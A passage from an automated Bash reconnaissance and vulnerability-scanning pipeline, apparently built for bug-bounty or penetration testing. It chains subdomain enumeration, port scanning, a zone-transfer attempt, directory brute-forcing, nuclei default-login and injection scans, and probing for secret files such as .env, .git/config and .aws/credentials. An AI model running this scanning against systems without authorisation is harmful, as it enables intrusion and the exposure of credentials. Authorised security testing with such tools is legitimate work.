            anew_append "$ALL_SUBS" | wc -l | { read _n; log_ok "  assetfinder: ${_n} new"; }
    fi

    # Passive: crt.sh (certificate transparency)
    log_info "Querying crt.sh (cert transparency)..."
    curl -s --connect-timeout 15 \
        "https://crt.sh/?q=%25.${TARGET}&output=json" 2>/dev/null | \
        python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for entry in data:
        for name in entry.get('name_value','').split('\n'):
            name = name.strip().lstrip('*.')
            if name and '.' in name:
                print(name)
except: pass" 2>/dev/null | sort -u | anew_append "$ALL_SUBS" | wc -l | \
        { read _n; log_ok "  crt.sh: ${_n} new"; }

    # Passive: hackertarget
    log_info "Querying hackertarget..."
    curl -s --connect-timeout 10 \
        "https://api.hackertarget.com/hostsearch/?q=${TARGET}" 2>/dev/null | \
        grep -oP "^[^,]+" | anew_append "$ALL_SUBS" | wc -l | \
        { read _n; log_ok "  hackertarget: ${_n} new"; }

    # Passive: urlscan.io
    log_info "Querying urlscan.io..."
    curl -s --connect-timeout 10 \
        "https://urlscan.io/api/v1/search/?q=domain:${TARGET}&size=200" 2>/dev/null | \
        python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for r in data.get('results', []):
        d = r.get('page', {}).get('domain','')
        if d: print(d)
except: pass" 2>/dev/null | anew_append "$ALL_SUBS" | wc -l | \
        { read _n; log_ok "  urlscan.io: ${_n} new"; }

    # Passive: alienvault OTX
    log_info "Querying AlienVault OTX..."
    curl -s --connect-timeout 10 \
        "https://otx.alienvault.com/api/v1/indicators/domain/${TARGET}/passive_dns" 2>/dev/null | \
        python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    for r in data.get('passive_dns', []):
        h = r.get('hostname','')
        if h and h.endswith('.${TARGET}'):
            print(h)
except: pass" 2>/dev/null | anew_append "$ALL_SUBS" | wc -l | \
        { read _n; log_ok "  AlienVault OTX: ${_n} new"; }

    # Active DNS bruteforce
    if ! $SKIP_BRUTEFORCE; then
        local wl=""
        for w in \
            "${WORDLIST_DIR}/Discovery/DNS/subdomains-top1million-20000.txt" \
            "${WORDLIST_DIR}/Discovery/DNS/subdomains-top1million-5000.txt" \
            "/usr/share/dnsrecon/subdomains-top1million-5000.txt" \
            "/usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt"; do
            [[ -f "$w" ]] && { wl="$w"; break; }
        done

        if [[ -n "$wl" ]]; then
            if require_tool puredns; then
                log_info "DNS bruteforce with puredns (~$(wc -l < "$wl") words, max 10m)..."
                local _puredns_cmd="puredns bruteforce \"$wl\" \"$TARGET\" -r \"$RESOLVERS\" --wildcard-tests 5 --rate-limit 10000 -q"
                timeout 600 puredns bruteforce "$wl" "$TARGET" \
                    -r "$RESOLVERS" \
                    --wildcard-tests 5 \
                    --rate-limit 10000 \
                    -q 2>/dev/null | anew_append "$ALL_SUBS" | wc -l | \
                    { read _n; log_ok "  puredns brute: ${_n} new"; } || \
                    { [[ $? -eq 124 ]] && defer_cmd "puredns bruteforce (timed out at 10m)" "$_puredns_cmd | anew \"$ALL_SUBS\""; true; }
            elif require_tool shuffledns; then
                log_info "DNS bruteforce with shuffledns (max 10m)..."
                local _shuffledns_cmd="shuffledns -d \"$TARGET\" -w \"$wl\" -r \"$RESOLVERS\" -t 1000 -silent"
                timeout 600 shuffledns -d "$TARGET" -w "$wl" -r "$RESOLVERS" -t 1000 -silent 2>/dev/null | \
                    anew_append "$ALL_SUBS" | wc -l | \
                    { read _n; log_ok "  shuffledns: ${_n} new"; } || \
                    { [[ $? -eq 124 ]] && defer_cmd "shuffledns bruteforce (timed out at 10m)" "$_shuffledns_cmd | anew \"$ALL_SUBS\""; true; }
            fi
        fi
    fi

    # Final dedup count
    local total; total=$(sort -u "$ALL_SUBS" 2>/dev/null | wc -l)
    sort -u "$ALL_SUBS" -o "$ALL_SUBS"
    log_ok "Total unique subdomains: ${BOLD}${total}${RESET}"
}

# ─── Phase 2: DNS Resolution ───────────────────────────────────────────────────
phase_dns() {
    log_phase "Phase 2: DNS Resolution & Validation"

    if [[ ! -s "$ALL_SUBS" ]]; then
        log_warn "No subdomains found, skipping DNS resolution."
        return
    fi

    setup_resolvers

    if require_tool puredns; then
        log_info "Resolving subdomains with puredns..."
        puredns resolve "$ALL_SUBS" \
            -r "$RESOLVERS" \
            --wildcard-tests 5 \
            -q 2>/dev/null > "$RESOLVED_SUBS"
        # Validate output — puredns silently writes error messages when massdns
        # is missing. If no valid hostnames came out, fall through to dnsx.
        local _valid; _valid=$(grep -cE '^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$' "$RESOLVED_SUBS" 2>/dev/null || echo 0)
        if [[ "$_valid" -eq 0 ]]; then
            log_warn "puredns produced no valid hostnames — falling back to dnsx for resolution"
            > "$RESOLVED_SUBS"
        fi
    fi

    if [[ ! -s "$RESOLVED_SUBS" ]] && require_tool dnsx; then
        log_info "Resolving with dnsx..."
        dnsx -l "$ALL_SUBS" \
            -r "$RESOLVERS" \
            -silent \
            -resp \
            -a -cname \
            -o "$DNS_DIR/dnsx_full.txt" 2>/dev/null | \
            awk '{print $1}' > "$RESOLVED_SUBS"
    fi

    # Last resort: if still empty, use raw subdomain list so downstream phases
    # are not starved (httpx will filter out unresolvable ones itself)
    if [[ ! -s "$RESOLVED_SUBS" ]]; then
        log_warn "No DNS resolver tool found. Using all subdomains as-is."
        grep -E '^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$' "$ALL_SUBS" > "$RESOLVED_SUBS" || cp "$ALL_SUBS" "$RESOLVED_SUBS"
    fi

    # Extract IPs
    if require_tool dnsx; then
        log_info "Extracting IPs and CNAME records..."
        dnsx -l "$RESOLVED_SUBS" -silent -a -resp-only -o "$DNS_DIR/ips.txt" 2>/dev/null || true
        dnsx -l "$RESOLVED_SUBS" -silent -cname -resp-only -o "$DNS_DIR/cnames.txt" 2>/dev/null || true
    fi

    # Permutation enumeration
    if require_tool alterx && [[ -s "$RESOLVED_SUBS" ]]; then
        log_info "Running permutation enumeration (alterx)..."
        cat "$RESOLVED_SUBS" | alterx -silent 2>/dev/null | \
            dnsx -silent -r "$RESOLVERS" 2>/dev/null | \
            anew_append "$RESOLVED_SUBS" | wc -l | \
            { read _n; log_ok "  alterx permutations: ${_n} new"; }
    fi

    local count; count=$(wc -l < "$RESOLVED_SUBS" 2>/dev/null || echo 0)
    sort -u "$RESOLVED_SUBS" -o "$RESOLVED_SUBS"
    log_ok "Resolved hosts: ${BOLD}${count}${RESET}"
}

# ─── Phase 3: Port Scanning ───────────────────────────────────────────────────
phase_ports() {
    if $SKIP_PORTSCAN; then
        log_warn "Skipping port scan (--skip-portscan)"
        return
    fi

    log_phase "Phase 3: Port Scanning"

    # Prefer unique IPs over hostnames — avoids hundreds of DNS failures on resolved subs
    local targets_file="$DNS_DIR/ips.txt"
    [[ ! -s "$targets_file" ]] && targets_file="$RESOLVED_SUBS"
    [[ ! -s "$targets_file" ]] && targets_file="$ALL_SUBS"
    [[ ! -s "$targets_file" ]] && { log_warn "No hosts to scan."; return; }

    local target_count; target_count=$(wc -l < "$targets_file")
    log_info "Port scanning ${target_count} targets (using $(basename "$targets_file"))..."

    # Naabu (fast, ProjectDiscovery)
    if require_tool naabu; then
        log_info "Running naabu (top 1000 ports)..."
        naabu -l "$targets_file" \
            -top-ports 1000 \
            -silent \
            -o "$PORTS_DIR/naabu_open.txt" 2>/dev/null || true
        local open_count; open_count=$(wc -l < "$PORTS_DIR/naabu_open.txt" 2>/dev/null || echo 0)
        log_ok "  naabu found ${open_count} open port/host combos"
    fi

    # Nmap service detection on IPs (max 10 min)
    if require_tool nmap && [[ -s "$targets_file" ]]; then
        log_info "Running nmap service detection (top ports, max 10m)..."
        local _nmap_cmd="nmap -iL \"$targets_file\" -Pn --top-ports 1000 --open --min-rate 5000 --max-retries 1 -T4 --host-timeout 60s -sV --script=http-title,http-headers -oA \"$PORTS_DIR/nmap\""
        timeout 600 nmap -iL "$targets_file" \
            -Pn \
            --top-ports 1000 \
            --open \
            --min-rate 5000 \
            --max-retries 1 \
            --host-timeout 60s \
            -T4 \
            -sV \
            --script=http-title,http-headers \
            -oA "$PORTS_DIR/nmap" \
            2>/dev/null | \
            grep -E "^[0-9]+/(tcp|udp)|Nmap scan report" | \
            tee "$PORTS_DIR/nmap_summary.txt" || \
            { [[ $? -eq 124 ]] && defer_cmd "nmap full scan (timed out)" "$_nmap_cmd"; true; }
        log_ok "  nmap scan complete → $PORTS_DIR/nmap.xml"
    fi
}

# ─── Phase 4: HTTP Probing ────────────────────────────────────────────────────
phase_http() {
    log_phase "Phase 4: HTTP Probing & Fingerprinting"

    local targets_file="$RESOLVED_SUBS"
    [[ ! -s "$targets_file" ]] && targets_file="$ALL_SUBS"

    # Always ensure the base domain is probed regardless of resolution results
    local _combined="$HTTP_DIR/targets_tmp.txt"
    if [[ -s "$targets_file" ]]; then
        grep -E '^[a-zA-Z0-9._-]+\.[a-zA-Z]{2,}$' "$targets_file" > "$_combined" 2>/dev/null || cp "$targets_file" "$_combined"
    fi
    echo "$TARGET" >> "$_combined"
    sort -u "$_combined" -o "$_combined"
    targets_file="$_combined"

    if ! require_tool httpx; then
        log_warn "httpx not found. Using basic curl probe."
        while read -r host; do
            for proto in https http; do
                code=$(curl -s -o /dev/null -w "%{http_code}" --connect-timeout 5 "${proto}://${host}" 2>/dev/null)
                [[ "$code" =~ ^[23] ]] && echo "${proto}://${host}" >> "$LIVE_HOSTS"
            done
        done < "$targets_file"
        return
    fi

    log_info "Probing with httpx (ports: 80,443,8080,8443,8888,3000,5000,4443)..."
    httpx -l "$targets_file" \
        -p 80,443,8080,8443,8888,3000,5000,4443,9090 \
        -silent \
        -title \
        -status-code \
        -content-length \
        -content-type \
        -web-server \
        -ip \
        -cdn \
        -tech-detect \
        -follow-redirects \
        -random-agent \
        -threads "$THREADS" \
        ${AUTH_HTTPX_OPTS[@]+"${AUTH_HTTPX_OPTS[@]}"} \
        -o "$HTTP_DIR/httpx_full.txt" 2>/dev/null || true

    # Extract clean URL list
    awk '{print $1}' "$HTTP_DIR/httpx_full.txt" 2>/dev/null | sort -u > "$LIVE_HOSTS"

    local live_count; live_count=$(wc -l < "$LIVE_HOSTS" 2>/dev/null || echo 0)
    log_ok "Live web hosts: ${BOLD}${live_count}${RESET}"

    # Also extract 403 responses for later bypass testing
    grep " 403 " "$HTTP_DIR/httpx_full.txt" 2>/dev/null | awk '{print $1}' | \
        sort -u > "$HTTP_DIR/forbidden_hosts.txt" || true

    # Extract hosts by technology for targeted scanning
    grep -i "wordpress" "$HTTP_DIR/httpx_full.txt" 2>/dev/null | awk '{print $1}' | \
        sort -u > "$HTTP_DIR/wordpress_hosts.txt" || true
    grep -i "jenkins\|jira\|confluence\|gitlab" "$HTTP_DIR/httpx_full.txt" 2>/dev/null | \
        awk '{print $1}' | sort -u > "$HTTP_DIR/devtools_hosts.txt" || true
}

# ─── Phase 4b: Infrastructure — TLS, Headers, DNS Hygiene ────────────────────
phase_infra() {
    log_phase "Phase 4b: Infrastructure Analysis (TLS / Headers / DNS)"

    mkdir -p "$OUTDIR/infra"
    local infra_dir="$OUTDIR/infra"

    # ── TLS/SSL (nuclei ssl templates) ────────────────────────────────────────
    if require_tool nuclei && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Checking TLS/SSL configuration..."
        nuclei -l "$LIVE_HOSTS" \
            -t /home/kali/nuclei-templates/ssl/ \
            -rl "$RATE_LIMIT" -c 20 -j \
            -silent \
            -o "$infra_dir/tls_findings.jsonl" 2>/dev/null || true
        local tls_count; tls_count=$(wc -l < "$infra_dir/tls_findings.jsonl" 2>/dev/null || echo 0)
        [[ "$tls_count" -gt 0 ]] && log_finding "TLS issues: ${BOLD}${tls_count}${RESET} → $infra_dir/tls_findings.jsonl"
    fi

    # ── Security Headers (nuclei + httpx) ────────────────────────────────────
    if require_tool nuclei && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Checking security headers..."
        nuclei -l "$LIVE_HOSTS" \
            -t /home/kali/nuclei-templates/http/misconfiguration/http-missing-security-headers.yaml \
            -t /home/kali/nuclei-templates/http/misconfiguration/weak-csp-detect.yaml \
            -rl "$RATE_LIMIT" -c 20 -j \
            -silent \
            -o "$infra_dir/header_findings.jsonl" 2>/dev/null || true
        local hdr_count; hdr_count=$(wc -l < "$infra_dir/header_findings.jsonl" 2>/dev/null || echo 0)
        [[ "$hdr_count" -gt 0 ]] && log_finding "Header issues: ${BOLD}${hdr_count}${RESET} → $infra_dir/header_findings.jsonl"
    fi

    # ── DNS hygiene: SPF, DMARC, CAA ────────────────────────────────────────
    log_info "Checking DNS hygiene (SPF / DMARC / CAA)..."
    local dns_hygiene="$infra_dir/dns_hygiene.txt"
    {
        # SPF
        local spf; spf=$(dig +short TXT "$TARGET" 2>/dev/null | grep -i "v=spf1" | head -1)
        if [[ -n "$spf" ]]; then
            echo "[SPF] FOUND: $spf"
        else
            echo "[SPF] MISSING — no SPF record on $TARGET"
            log_finding "SPF record missing on $TARGET"
        fi

        # DMARC
        local dmarc; dmarc=$(dig +short TXT "_dmarc.${TARGET}" 2>/dev/null | grep -i "v=DMARC1" | head -1)
        if [[ -n "$dmarc" ]]; then
            echo "[DMARC] FOUND: $dmarc"
            # Check policy
            echo "$dmarc" | grep -qi "p=none" && \
                { echo "[DMARC] WEAK — policy is p=none (no enforcement)"; log_finding "DMARC policy is p=none on $TARGET (no enforcement)"; }
        else
            echo "[DMARC] MISSING — no DMARC record on $TARGET"
            log_finding "DMARC record missing on $TARGET"
        fi

        # CAA
        local caa; caa=$(dig +short CAA "$TARGET" 2>/dev/null)
        if [[ -n "$caa" ]]; then
            echo "[CAA] FOUND: $caa"
        else
            echo "[CAA] MISSING — no CAA record, any CA can issue certs for $TARGET"
            log_finding "CAA record missing on $TARGET"
        fi

        # Zone transfer attempt
        local ns; ns=$(dig +short NS "$TARGET" 2>/dev/null | head -1)
        if [[ -n "$ns" ]]; then
            local axfr; axfr=$(dig axfr "$TARGET" @"$ns" 2>/dev/null | grep -v "^;" | grep -v "^$")
            if echo "$axfr" | grep -qiE "AXFR|SOA"; then
                echo "[ZONE TRANSFER] VULNERABLE — zone transfer allowed from $ns"
                log_finding "Zone transfer allowed on $TARGET via $ns"
                echo "$axfr" > "$infra_dir/zone_transfer.txt"
            else
                echo "[ZONE TRANSFER] Refused (expected)"
            fi
        fi
    } > "$dns_hygiene"
    log_ok "DNS hygiene report → $dns_hygiene"

    # ── Version fingerprinting summary from httpx ────────────────────────────
    if [[ -s "$HTTP_DIR/httpx_full.txt" ]]; then
        log_info "Extracting version fingerprints from httpx output..."
        grep -oE "\[([A-Za-z0-9._-]+:[0-9]+\.[0-9]+[.0-9]*)\]" "$HTTP_DIR/httpx_full.txt" 2>/dev/null | \
            sort -u > "$infra_dir/versions.txt" || true
        local ver_count; ver_count=$(wc -l < "$infra_dir/versions.txt" 2>/dev/null || echo 0)
        [[ "$ver_count" -gt 0 ]] && log_ok "Version fingerprints: ${ver_count} → $infra_dir/versions.txt"
    fi

    log_ok "Infrastructure analysis complete → $infra_dir/"
}

# ─── Phase 5: Web Crawling & URL Collection ────────────────────────────────────
phase_crawl() {
    if $SKIP_CRAWL; then
        log_warn "Skipping web crawl (--skip-crawl)"
        return
    fi

    log_phase "Phase 5: Web Crawling & URL Collection"

    [[ ! -s "$LIVE_HOSTS" ]] && { log_warn "No live hosts to crawl."; return; }

    # Katana
    if require_tool katana; then
        log_info "Crawling with katana (depth=${DEPTH}, JS parsing enabled)..."
        local katana_args=(-u "$LIVE_HOSTS" -d "$DEPTH" -jc -aff -kf all -silent -timeout 10)
        [[ -n "$SCOPE_REGEX" ]] && katana_args+=(-cs "$SCOPE_REGEX")
        [[ ${#AUTH_KATANA_OPTS[@]} -gt 0 ]] && katana_args+=("${AUTH_KATANA_OPTS[@]}")
        katana "${katana_args[@]}" 2>/dev/null | anew_append "$ALL_URLS" | wc -l | \
            { read _n; log_ok "  katana: ${_n} new URLs"; }

        # Headless for SPAs — hard cap at 5 min so it never hangs the pipeline
        log_info "Katana headless mode (SPA/dynamic content, max 5m)..."
        timeout 300 katana -u "$LIVE_HOSTS" -d 2 -headless -jc -silent -timeout 15 -c 3 \
            ${AUTH_KATANA_OPTS[@]+"${AUTH_KATANA_OPTS[@]}"} 2>/dev/null | \
            anew_append "$ALL_URLS" | wc -l | { read _n; log_ok "  katana headless: ${_n} new URLs"; } || \
            log_warn "  katana headless: timed out / exited early (URLs saved so far)"
    fi

    # GAU
    if require_tool gau; then
        log_info "Collecting archived URLs (gau)..."
        gau "$TARGET" \
            --threads 5 \
            --subs \
            --blacklist png,jpg,gif,svg,css,woff,ttf,ico,eot \
            --providers wayback,commoncrawl,otx,urlscan 2>/dev/null | \
            anew_append "$ALL_URLS" | wc -l | { read _n; log_ok "  gau: ${_n} new URLs"; }
    fi

    # Waybackurls
    if require_tool waybackurls; then
        log_info "Querying Wayback Machine..."
        echo "$TARGET" | waybackurls 2>/dev/null | \
            anew_append "$ALL_URLS" | wc -l | { read _n; log_ok "  waybackurls: ${_n} new URLs"; }
    fi

    # Waymore
    if require_tool waymore; then
        log_info "Running waymore (URL + response archive)..."
        waymore -i "$TARGET" -mode U -oU "$URLS_DIR/waymore.txt" -q 2>/dev/null || true
        if [[ -s "$URLS_DIR/waymore.txt" ]]; then
            cat "$URLS_DIR/waymore.txt" | anew_append "$ALL_URLS" | wc -l | \
                { read _n; log_ok "  waymore: ${_n} new URLs"; }
        fi
    fi

    # Deduplicate
    sort -u "$ALL_URLS" -o "$ALL_URLS"
    local url_count; url_count=$(wc -l < "$ALL_URLS" 2>/dev/null || echo 0)
    log_ok "Total unique URLs: ${BOLD}${url_count}${RESET}"

    # Extract JS files
    grep -E "\.js(\?|$)" "$ALL_URLS" 2>/dev/null | sort -u > "$JS_FILES" || true
    log_ok "JS files found: $(wc -l < "$JS_FILES" 2>/dev/null || echo 0)"
}

# ─── Phase 6: Content Discovery ───────────────────────────────────────────────
phase_content() {
    if $SKIP_CONTENT; then
        log_warn "Skipping content discovery (--skip-content)"
        return
    fi

    log_phase "Phase 6: Content Discovery (Directory/File Bruteforce)"

    [[ ! -s "$LIVE_HOSTS" ]] && { log_warn "No live hosts for content discovery."; return; }

    # Find best available wordlist
    local wordlist=""
    for w in \
        "${WORDLIST_DIR}/Discovery/Web-Content/raft-large-directories.txt" \
        "${WORDLIST_DIR}/Discovery/Web-Content/raft-medium-directories.txt" \
        "${WORDLIST_DIR}/Discovery/Web-Content/common.txt" \
        "/usr/share/dirb/wordlists/common.txt"; do
        [[ -f "$w" ]] && { wordlist="$w"; break; }
    done

    if [[ -z "$wordlist" ]]; then
        log_warn "No wordlist found. Skipping content discovery."
        log_info "  Install SecLists: sudo apt install seclists"
        return
    fi

    log_info "Using wordlist: $(basename "$wordlist")"

    # Limit to first 20 live hosts for performance
    local hosts_to_scan; hosts_to_scan=$(head -20 "$LIVE_HOSTS")

    if require_tool ffuf; then
        log_info "Running ffuf on top hosts (100 threads, max 5m/host)..."
        while IFS= read -r url; do
            local host_slug; host_slug=$(echo "$url" | sed 's|https\?://||;s|/|_|g')
            local _ffuf_cmd="ffuf -u \"${url}/FUZZ\" -w \"$wordlist\" -mc 200,301,302,403,405 -t 100 -timeout 10 -of json -o \"$OUTDIR/recon/wordlists/ffuf_${host_slug}.json\" -s"
            timeout 300 ffuf -u "${url}/FUZZ" \
                -w "$wordlist" \
                -mc 200,301,302,403,405 \
                -t 100 \
                -timeout 10 \
                -of json \
                ${AUTH_FFUF_OPTS[@]+"${AUTH_FFUF_OPTS[@]}"} \
                -o "$OUTDIR/recon/wordlists/ffuf_${host_slug}.json" \
                -s 2>/dev/null || \
                { [[ $? -eq 124 ]] && defer_cmd "ffuf on ${url} (timed out at 5m)" "$_ffuf_cmd"; true; }
        done <<< "$hosts_to_scan"
        log_ok "ffuf scans saved to: $OUTDIR/recon/wordlists/"
    fi

    # Feroxbuster for recursive discovery (max 5m/host)
    if require_tool feroxbuster && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Running feroxbuster (recursive, 50 threads, max 5m/host)..."
        head -10 "$LIVE_HOSTS" | while IFS= read -r url; do
            local host_slug; host_slug=$(echo "$url" | sed 's|https\?://||;s|/|_|g')
            local _ferox_cmd="feroxbuster -u \"$url\" -w \"$wordlist\" -t 50 --timeout 10 -r --recursion-depth 2 --silent -o \"$OUTDIR/recon/wordlists/ferox_${host_slug}.txt\""
            timeout 300 feroxbuster -u "$url" \
                -w "$wordlist" \
                -t 50 \
                --timeout 10 \
                -r \
                --recursion-depth 2 \
                --silent \
                ${AUTH_FEROX_OPTS[@]+"${AUTH_FEROX_OPTS[@]}"} \
                -o "$OUTDIR/recon/wordlists/ferox_${host_slug}.txt" \
                2>/dev/null || \
                { [[ $? -eq 124 ]] && defer_cmd "feroxbuster on ${url} (timed out at 5m)" "$_ferox_cmd"; true; }
        done
        log_ok "feroxbuster scans complete"
    fi

    # .env / backup / sensitive file probing
    if require_tool httpx && [[ -s "$LIVE_HOSTS" ]]; then
        log_info "Probing sensitive paths (.env, .git, backup files)..."
        local sensitive_paths=".env,.git/config,.git/HEAD,backup.zip,backup.sql,db.sql,.htpasswd,web.config,phpinfo.php,wp-config.php,config.php,database.yml,secrets.yml,credentials.json,.aws/credentials,composer.json,package.json,Dockerfile,.dockerenv,server-status,server-info,elmah.axd,trace.axd,crossdomain.xml,.DS_Store,robots.txt,sitemap.xml"
        httpx -l "$LIVE_HOSTS" \
            -path "$sensitive_paths" \
            -mc 200,403 \
            -silent \
            -threads 50 \
            ${AUTH_HTTPX_OPTS[@]+"${AUTH_HTTPX_OPTS[@]}"} \
            -o "$HTTP_DIR/sensitive_files.txt" 2>/dev/null || true
        local found; found=$(wc -l < "$HTTP_DIR/sensitive_files.txt" 2>/dev/null || echo 0)
        [[ "$found" -gt 0 ]] && log_finding "Sensitive files found: ${found} → $HTTP_DIR/sensitive_files.txt"
    fi
}

# ─── Phase 7: Vulnerability Scanning ──────────────────────────────────────────
phase_vulns() {
    if $SKIP_VULNS; then
        log_warn "Skipping vulnerability scan (--skip-vulns)"
        return
    fi

    log_phase "Phase 7: Nuclei Vulnerability Scanning"

    [[ ! -s "$LIVE_HOSTS" ]] && { log_warn "No live hosts for vuln scanning."; return; }

    if ! require_tool nuclei; then
        log_warn "nuclei not found. Checking /home/kali/Tools/linux/nuclei..."
        if [[ -x "/home/kali/Tools/linux/nuclei" ]]; then
            NUCLEI_BIN="/home/kali/Tools/linux/nuclei"
        else
            return
        fi
    else
        NUCLEI_BIN="nuclei"
    fi

    # Update templates once (fast, non-blocking check)
    log_info "Updating nuclei templates..."
    $NUCLEI_BIN -update-templates -silent 2>/dev/null || true

    # ── Parallel nuclei scans ─────────────────────────────────────────────────
    # Run independent scan categories concurrently in background;
    # collect PIDs and wait for all before merging.
    log_info "Launching parallel nuclei scan categories..."

    local pids=()
    local auth_opts=()
    ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]:+true}"} 2>/dev/null && \
        auth_opts=("${AUTH_NUCLEI_OPTS[@]}")

    # 1 — Critical & High (highest priority, slightly more concurrency)
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -s critical,high \
            -rl "$RATE_LIMIT" -c 25 -j \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/critical_high.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 2 — CVE templates
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -tags cve \
            -rl "$RATE_LIMIT" -c 20 -j \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/cves.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 3 — Misconfigurations
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -tags misconfig \
            -rl "$RATE_LIMIT" -c 20 -j \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/misconfigs.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 4 — Exposures & info disclosure
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -tags exposure \
            -rl "$RATE_LIMIT" -c 20 -j \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/exposures.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 5 — Default-login templates (lower rate to avoid lockouts)
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" -tags "default-login" \
            -rl 30 -c 10 -j \
            -o "$VULN_DIR/nuclei/default_logins.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 6 — DAST fuzzing against all live hosts (headless for SPA/JS-heavy apps)
    (
        cp "$LIVE_HOSTS" "$HTTP_DIR/dast_targets.txt"
        $NUCLEI_BIN -l "$HTTP_DIR/dast_targets.txt" -dast \
            -rl 25 -c 5 -j \
            -headless \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/dast.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 9 — Injection/auth/logic vulnerability tags (sqli, xss, ssrf, lfi, rce, jwt, idor, graphql)
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" \
            -tags "sqli,xss,ssrf,lfi,rce,jwt,idor,graphql,oauth,token,injection,auth-bypass" \
            -rl "$RATE_LIMIT" -c 20 -j \
            -retries 2 \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/injections.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 10 — Network/tech-specific templates (exposed panels, tokens, keys)
    (
        $NUCLEI_BIN -l "$LIVE_HOSTS" \
            -tags "token,api,key,secret,panel,login,auth,config,debug,swagger,graphql" \
            -s critical,high,medium \
            -rl "$RATE_LIMIT" -c 20 -j \
            -retries 2 \
            ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
            -o "$VULN_DIR/nuclei/panels_tokens.jsonl" \
            -silent 2>/dev/null || true
    ) &
    pids+=($!)

    # 7 — WordPress (only if detected)
    if [[ -s "$HTTP_DIR/wordpress_hosts.txt" ]]; then
        (
            $NUCLEI_BIN -l "$HTTP_DIR/wordpress_hosts.txt" -tags wordpress \
                -rl 50 -c 15 -j \
                ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
                -o "$VULN_DIR/nuclei/wordpress.jsonl" \
                -silent 2>/dev/null || true
        ) &
        pids+=($!)
    fi

    # 8 — Dev tools (Jenkins, Jira, Confluence, GitLab)
    if [[ -s "$HTTP_DIR/devtools_hosts.txt" ]]; then
        (
            $NUCLEI_BIN -l "$HTTP_DIR/devtools_hosts.txt" \
                -tags "jenkins,jira,confluence,gitlab" \
                -rl 50 -c 15 -j \
                ${AUTH_NUCLEI_OPTS[@]+"${AUTH_NUCLEI_OPTS[@]}"} \
                -o "$VULN_DIR/nuclei/devtools.jsonl" \
                -silent 2>/dev/null || true
        ) &
        pids+=($!)
    fi

    log_info "  ${#pids[@]} scan jobs running in parallel (PIDs: ${pids[*]})..."

    # Poll Telegram while waiting for nuclei jobs to finish
    local done_count=0
    while [[ $done_count -lt ${#pids[@]} ]]; do
        done_count=0
        for pid in "${pids[@]}"; do
            kill -0 "$pid" 2>/dev/null || (( done_count++ )) || true
        done
        tg_poll_commands 2>/dev/null || true
        $TG_STOP_REQUESTED && { log_warn "Stop requested via Telegram."; break; }
        sleep "$TG_POLL_INTERVAL"
    done

    # Ensure all jobs finished
    for pid in "${pids[@]}"; do
        wait "$pid" 2>/dev/null || true
    done

    # Combine all findings, deduplicate
    cat "$VULN_DIR/nuclei/"*.jsonl 2>/dev/null | sort -u > "$VULN_DIR/nuclei/all_findings.jsonl"

    # Re-derive critical_high.jsonl from merged results so findings from all jobs are included
    python3 -c "
import sys, json
for line in open('$VULN_DIR/nuclei/all_findings.jsonl'):
    try:
        d = json.loads(line)
        if d.get('info',{}).get('severity','').lower() in ('critical','high'):
            print(line.strip())
    except: pass
" 2>/dev/null > "$VULN_DIR/nuclei/critical_high.jsonl" || true

    local total; total=$(wc -l < "$VULN_DIR/nuclei/all_findings.jsonl" 2>/dev/null || echo 0)
    local crit_count; crit_count=$(wc -l < "$VULN_DIR/nuclei/critical_high.jsonl" 2>/dev/null || echo 0)
    log_ok "Total nuclei findings: ${BOLD}${total}${RESET} (critical/high: ${crit_count})"

    [[ "$crit_count" -gt 0 ]] && {
        log_finding "Critical/High findings: ${BOLD}${crit_count}${RESET}"
        notify_all "🚨 *Critical/High findings on ${TARGET}*: ${crit_count} findings\nNuclei total: ${total}"
    }
}

# ─── Phase 8: XSS Scanning ────────────────────────────────────────────────────
phase_xss() {
    log_phase "Phase 8: XSS Detection"

    if [[ ! -s "$ALL_URLS" ]]; then
        log_warn "No URLs collected for XSS testing."
        return
    fi

    # Filter URLs with parameters
    local param_urls="$VULN_DIR/xss/param_urls.txt"
    grep "=" "$ALL_URLS" 2>/dev/null | sort -u > "$param_urls"
    local param_count; param_count=$(wc -l < "$param_urls" 2>/dev/null || echo 0)
    log_info "URLs with parameters: ${param_count}"

    # GF filter for XSS candidates
    local xss_candidates="$VULN_DIR/xss/xss_candidates.txt"
    if require_tool gf; then
